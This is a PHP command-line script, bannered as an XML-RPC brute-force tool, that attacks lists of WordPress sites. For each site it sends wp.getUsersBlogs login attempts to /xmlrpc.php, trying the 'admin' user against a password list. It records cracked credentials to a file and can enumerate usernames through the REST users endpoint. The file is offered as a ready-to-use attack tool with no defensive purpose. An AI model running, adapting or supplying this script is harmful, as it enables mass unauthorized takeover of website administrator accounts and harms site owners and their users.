<?php
error_reporting(0);
$G  = "\e[92m";
$R  = "\e[91m";
$Y  = "\e[93m";
$B  = "\e[94m";
$P  = "\e[35m";
$C  = "\e[36m";
// data
//$user = ["admin"];
$pas = ['akandiubah!','inijugasama','Ini juga:v', //baris ini jangan di ubah!
];
$gs = "pass.txt";
$listpass = trim(file_get_contents($gs));
if(!$listpass){
  echo $gs." Tidak ditemukan !\n";
  exit;
}
$listpass = explode("\n",$listpass);
foreach($listpass as $pausigansbngt){
  $pas[] = $pausigansbngt;
  echo "--";
  sleep(0.5);
}

$xmlrpc = "/xmlrpc.php";
$isadmin = '<name>isAdmin</name>';
$agent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0";
$header = array('Content-Type: application/x-www-form-urlencoded');
$timeout = 10;
$error = [0,404,401,403,500,408,502,503,504,521,522,520];
$sev = fopen("berhasil.txt","w");
function xml($user,$pw){
 	$xml="
	   <methodCall>
                <methodName>wp.getUsersBlogs</methodName>
                <params>
                <param><value><string>$user</string></value></param>
                <param><value><string>$pw</string></value></param>
           </params></methodCall>";
	return $xml;
}
$user = "admin";
banner();
echo $P."Chose List =>$C ";
$l = trim(fgets(STDIN));
$buka = fopen("$l","r");
$ukuran = filesize("$l");
$baca = fread($buka,$ukuran);
$urls = explode("\n",$baca);
foreach($urls as $url){
$usercek = $url;
$url = $url.$xmlrpc;
echo $Y."[ Cek ] $url ";
$gans = cekhttp($url);
 if(in_array($gans,$error)){
  echo $R."\n[ Bad ] $url \n";
  continue;
 }
$pas[0] = $user;
$pas[1] = $user.'123';
$pas[2] = $user.'12345';
echo "\n";
 foreach($pas as $pass){
  $xml = xml($user,$pass);
  $ekse = curl($url,$agent,$header,$xml,$timeout);
  if(strstr($ekse, $isadmin)){
    echo $G."[ God ] $url $user => $pass \n";
  $sv = "[OK]  ".$url." $user|$pass \n";
    fwrite($sev,$sv);
    //file_put_contents('b.txt', $sv, LOCK_EX);
    break;
  }
  }
 }
fclose($sev);
function curl($url,$agent,$header,$xml,$timeout){
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, $agent);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
  curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
  curl_setopt($ch, CURLOPT_ENCODING, '');
  $_ = curl_exec($ch);
//  echo $_;
  curl_close($ch);
 return $_;
}function getuser($url){
$url = "http://$url/wp-json/wp/v2/users";
$url = file_get_contents($url);
//print_r($url);
$user = json_decode($url,true);
$user = $user[0]['slug'];
if($user){
  echo $user;
  return $user;
}else{
  echo "admin";
  $user = "admin";
  return $user;
}
}function cekhttp($url){
  global $agent;
  global $header;
  global $timeout;
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_NOBODY, true);
  curl_setopt($ch, CURLOPT_USERAGENT, $agent);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
  $res = curl_exec($ch);
  $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  echo $http;
  return $http;
}function save($nfile,$tex){
$f =fopen($nfile,"W+");
fwrite($f,$tex);
$fclose($f);
}function banner(){
global $C;
global $G;
global $R;
echo $C."
 _       __      ____  ____
| |     / /___  / __ )/ __/
| | /| / / __ \/ __  / /_
| |/ |/ / /_/ / /_/ / __/
|__/|__/ .___/_____/_/
      /_/ Xmlrpc BruteForce
      Gretz By Priv8 B0otGank

";
}
?>

